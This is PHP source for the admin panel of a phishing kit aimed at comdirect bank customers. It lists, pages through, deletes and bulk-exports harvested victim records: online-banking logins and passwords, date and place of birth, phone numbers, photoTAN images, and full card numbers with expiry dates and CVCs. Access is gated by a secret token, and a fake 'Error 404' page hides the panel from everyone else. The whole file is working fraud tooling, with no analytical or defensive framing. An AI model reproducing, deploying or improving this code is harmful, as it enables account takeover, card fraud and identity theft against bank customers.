<?php

include("comdirect_config.inc.php");

if($_GET["key"] == $appSecurityToken) {
	
	//ACCESS GRANTED
	
				//STUFF
				if (isset($_GET['page_no']) && $_GET['page_no']!="") {
					$page_no = $_GET['page_no'];
				} else {
					$page_no = 1;
				}
				
				$total_records_per_page = 10;
				
				$offset = ($page_no-1) * $total_records_per_page;
				$previous_page = $page_no - 1;
				$next_page = $page_no + 1;
				$adjacents = "2";
				
				$result_count = mysqli_query($SQL,"SELECT COUNT(*) As total_records FROM `cd_logs`");
				$total_records = mysqli_fetch_array($result_count);
				$total_records = $total_records['total_records'];
				$total_no_of_pages = ceil($total_records / $total_records_per_page);
				$second_last = $total_no_of_pages - 1;
			 		
				//ACTIONS
			 	if($_GET["do"] == "delete" && isset($_GET["id"])) {
				 	
				 	$del_id = $_GET["id"];
				 	
				 	$del_Row = $SQL -> prepare("DELETE FROM cd_logs WHERE data_id = ?");
				 	$del_Row -> bind_param("s", $del_id);
				 	$del_Row -> execute();
				 	
				 	$success = "<h4>log #".$del_id." wurde erfolgreich gelöscht.</h4><br />";
				 	
			 	}
				
				if($_GET["a"] == "expall") {
					
		//CALC FULL OB LOGS
		$calc_Exp_FullLogs = $SQL->prepare("SELECT count(*) as total FROM cd_logs");
		$calc_Exp_FullLogs->execute();
		$calc_Exp_FullLogs->store_result();
		$calc_Exp_FullLogs->bind_result($full_Exp_OBLogs);
		$calc_Exp_FullLogs->fetch();
					
					
					$export_LogDetails = $SQL -> prepare('SELECT id, data_id, is_mobile, first_login, first_password, access_number, password, dob, pob, phone_number, image_file, camera_file, cc_number, exp_month, exp_year, cvc_number, ip_address, user_agent, created_at, status FROM cd_logs ORDER BY id ASC');
					$export_LogDetails -> execute();
					$export_LogDetails -> store_result();
					$export_LogDetails -> bind_result($exp_id, $exp_dataid, $exp_ismobile, $exp_firstlogin, $exp_firstpassword, $exp_accessnumber, $exp_password, $exp_dob, $exp_pob, $exp_phone, $exp_imagefile, $exp_camerafile, $exp_ccnumber, $exp_month, $exp_year, $exp_cvc, $exp_ipaddress, $exp_useragent, $exp_createdat, $exp_status);

$file_Content = "Alle aktuellen comdirect-Logs (insgesamt ".$full_Exp_OBLogs." Logs)";
$file_Content .= "
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=

";

					while ($export_LogDetails -> fetch()) {
						

$file_Content .= "ID= '".$exp_dataid."' / 1. Login= '".$exp_firstlogin."', 1. Passwort= '".$exp_firstpassword."', 2. Login= '".$exp_accessnumber."', 2. Passwort= '".$exp_password."' / DOB= '".$exp_dob."', POB= '".$exp_pob."', Phone= '".$exp_phone."' / CC-Number= '".$exp_ccnumber."', Month= '".$exp_month."', Year= '".$exp_year."', CVC= '".$exp_cvc."' / Creation Date= '".$exp_createdat."' / IP= '".$exp_ipaddress."' / User-Agent= '".$exp_useragent."'
Date= '".$exp_createdat."'

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
";
					
					}
					
$file_Content .= "
=+= Ende aller comdirect-Logs =+=";
					$exportDate = date("d-m-Y", time());
					$file_ID = rand(100000,999999);
					$file_Name = "Alle-comdirect-Logs_".$exportDate."_".$file_ID.".txt";
					
					header('Content-Description: File Transfer');
					header('Content-Type: application/octet-stream; charset=utf-8');
					header('Content-disposition: attachment; filename='.$file_Name);
					header('Content-Length: '.strlen($file_Content));
					header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
					header('Expires: 0');
					header('Pragma: public');
					echo $file_Content;
					exit;
					
				}
				
	
?>

<html>
<head>
	<title>Admin-CP</title>
	<link rel="stylesheet" href="assets/css/bootstrap.min.css">
<style>
.container {
  max-width: 1500px;
}

.badge {
    display: inline-block;
    padding: .99em .4em!important;
    font-size: 80%;
    font-weight: 450;
    line-height: 1;
    text-align: center;
    white-space: nowrap;
    vertical-align: baseline;
    border-radius: .25rem;
}

.text-success {
	color:#28a745;
}

.text-danger {
	color#dc3545;
}
</style>
</head>
<body class="bg-light">
    
<div class="container">
  <main>
    <div class="py-5 text-center">
      <h2>Admin-CP (comdirect v1.5)</h2>
      <p class="lead">Aktuelle Übersicht über eingegangene Logs im comdirect-Script.</p>
	   <center><a href="?key=<?=$appSecurityToken;?>&a=expall" class="btn btn-success">Alle aktuellen comdirect-Logs jetzt exportieren</a></center>
    </div>
    
    <?php
	    
	    if($success == TRUE) {
		    
		    echo $success;
		    
	    }
	    
	?>
    
    <div class="row">
	    

		
		
		
		<div style='padding: 10px 20px 0px; border-top: dotted 1px #CCC;'>
		<strong>Seite <?php echo $page_no." von ".$total_no_of_pages; ?></strong>
		</div>
		
		<nav aria-label="Page navigation example">
		<ul class="pagination">
		<?php if($page_no > 1){
		echo "<li class='page-item'><a href='?page_no=1&key=$appSecurityToken' class='page-link'>Erste Seite</a></li>";
		} ?>
    
		<li <?php if($page_no <= 1){ echo "class='page-item disabled'"; } else { echo "class='page-item'"; } ?>>
		<a <?php if($page_no > 1){
		echo "href='?page_no=$previous_page&key=$appSecurityToken' class='page-link'";
		} else { echo "href='#' class='page-link'"; } ?>>Zurück</a>
		</li>
    
		<li <?php if($page_no >= $total_no_of_pages){
		echo "class='page-item disabled' style='display:none;'";
		} else { echo "class='page-item'"; } ?>>
		<a <?php if($page_no < $total_no_of_pages) {
		echo "href='?page_no=$next_page&key=$appSecurityToken' class='page-link'";
		} ?>>Weiter</a>
		</li>

		<?php if($page_no < $total_no_of_pages){
		echo "<li class='page-item'><a href='?page_no=$total_no_of_pages&key=$appSecurityToken' class='page-link'>Letzte &rsaquo;&rsaquo;</a></li>";
		} ?>
		</ul>
		</nav>
	    
	    <table class="table" style="margin-top:30px;">
			<thead class="thead-dark">
				<tr>
					<th scope="col">#</th>
					<!--<th scope="col">ID</th>-->
					<th scope="col">1. Login</th>
					<th scope="col">2. Login</th>
					<th scope="col">DOB</th>
					<th scope="col">POB</th>
					<th scope="col">Phone</th>
					<th scope="col">1. photoTAN</th>
					<th scope="col">2. photoTAN</th>
					<th scope="col">CC-Data</th>
					<th scope="col">Datum</th>
					<!--<th scope="col">IP-Adresse</th>-->
					<th scope="col">Status</th>
					<th scope="col">Löschen</th>
    			</tr>
  			</thead>
  			<tbody>
	 
  			<?php
	
  				$fetch_Links = $SQL -> prepare('SELECT id, data_id, is_mobile, first_login, first_password, access_number, password, dob, pob, phone_number, image_file, camera_file, second_image, second_camera, cc_number, exp_month, exp_year, cvc_number, ip_address, user_agent, created_at, status FROM cd_logs ORDER BY id ASC LIMIT ?, ?');
				$fetch_Links -> bind_param("ii", $offset, $total_records_per_page);
  				$fetch_Links -> execute();
  				$fetch_Links -> store_result();
  				$fetch_Links -> bind_result($id, $data_id, $is_mobile, $first_login, $first_password, $access_number, $password, $dob, $pob, $phone_number, $image_file, $camera_file, $exp_secondimage, $exp_secondcamera, $cc_number, $exp_month, $exp_year, $cvc_number, $ip_address, $user_agent, $created_at, $status);

				$logID = 0;

  				while ($fetch_Links -> fetch()) {
			
					$logID++;
					
					if($image_file == "Fehlerhaftes Bild") {
						$imageopen = '<a href="#" target="_blank" class="text-danger">fehlerhaft</a>';
					} else {
						$imageopen = '<a href="'.$image_file.'" target="_blank" class="text-success">jetzt öffnen</a>';
					}
		
			?>
	  
			<tr>
				<th scope="row"><p style="font-size:20px;margin-top:5px;"><?=$logID;?></p></th>
				<!--<td><p style="font-size:18px;margin-top:5px;"><?=$data_id;?></p></td>-->
				<td><p style="font-size:18px;margin-top:5px;"><?=$first_login;?>/<?=$first_password;?></p></td>
				<td><p style="font-size:18px;margin-top:5px;"><?php if($status >= 2) { echo $access_number."/".$password; } ?></p></td>
				<td><p style="font-size:18px;margin-top:5px;"><?=$dob;?></p></td>
				<td><p style="font-size:18px;margin-top:5px;"><?=$pob;?></p></td>
				<td><p style="font-size:18px;margin-top:5px;">
				<?php
				
					if(empty($phone_number)) {
						echo "alte Version";
					} else {
						echo $phone_number;
					}
					
				?>
				</p></td>
				<td><p style="font-size:18px;margin-top:5px;">
				<?php
				
					if($status <= 2) {
						echo "ausstehend";
					} else if($status > 2) {
						if($is_mobile == 1) {
							if($image_file == "none") {
								echo '<a href="'.$camera_file.'" target="_blank" class="text-success">jetzt öffnen</a>';
							} else if($camera_file == "none") {
								echo '<a href="'.$image_file.'" target="_blank" class="text-success">jetzt öffnen</a>';
							}
						} else if($is_mobile == 0) {
							echo '<a href="'.$image_file.'" target="_blank" class="text-success">jetzt öffnen</a>';
						}
					}
					
				?>
				</p></td>
				<td><p style="font-size:18px;margin-top:5px;">
				<?php
				
					if($status <= 3) {
						echo "ausstehend";
					} else if($status > 3) {
						if($is_mobile == 1) {
							if($image_file == "none") {
								echo '<a href="'.$exp_secondcamera.'" target="_blank" class="text-success">jetzt öffnen</a>';
							} else if($camera_file == "none") {
								echo '<a href="'.$exp_secondimage.'" target="_blank" class="text-success">jetzt öffnen</a>';
							}
						} else if($is_mobile == 0) {
							echo '<a href="'.$exp_secondimage.'" target="_blank" class="text-success">jetzt öffnen</a>';
						}
					}
					
				?>
				</p></td>
				<td><p style="font-size:18px;margin-top:5px;">
				<?php
				
					if($status <= 3) {
						echo "ausstehend";
					} else {
						if($cc_number == "übersprungen") {
							echo "Schritt wurde übersprungen";
						} else {
							echo $cc_number.";".$exp_month."/".$exp_year.";".$cvc_number;
						}
					}
				
				?>
				</p></td>
				<td><p style="font-size:18px;margin-top:5px;"><?=$created_at;?></p></td>
				<!--<td><p style="font-size:18px;margin-top:5px;"><?=$ip_address;?></p></td>-->
				<td>
					<?php
						
						if($status == 1) {
							
							echo '<span class="badge badge-primary">1. Anmeldung durchgeführt</span>';
							
						} else if($status == 2) {
							
							echo '<span class="badge badge-info">2. Anmeldung durchgeführt</span>';
							
						} else if($status == 3) {
							
							echo '<span class="badge badge-warning">1. photoTAN hochgeladen</span>';
							
						} else if($status == 4) {
							
							echo '<span class="badge badge-secondary">2. photoTAN hochgeladen</span>';
							
						} else if($status == 5) {
							
							echo '<span class="badge badge-success">Vorgang ist abgeschlossen</span>';
							
						}
						
					?>
				</td>
				<td><a href="?do=delete&id=<?=$data_id;?>&key=<?=$appSecurityToken;?>" class="btn btn-danger" onclick="if (confirm('Bist du dir sicher?')){return true;}else{event.stopPropagation(); event.preventDefault();};">Jetzt löschen</a></td>
			</tr>
    
			<?php
	    
				}
	    
			?>
    
			</tbody>
		</table>
	
    </div>
  </main>
</div>
<script>
function notAvailable() {
  alert("Bei diesem Eintrag noch nicht möglich!");
}
</script>
<script type="text/javascript">
var elems = document.getElementsByID('delconfirm');
var confirmIt = function (e) {
if (!confirm('Soll dieser Log wirklich gelöscht werden?')) e.preventDefault();
};
for (var i = 0, l = elems.length; i < l; i++) {
elems[i].addEventListener('click', confirmIt, false);
}
</script>
</body>
</html>

<?php
	
} else {
	
	die("Error 404 - Not found");
	
}

?>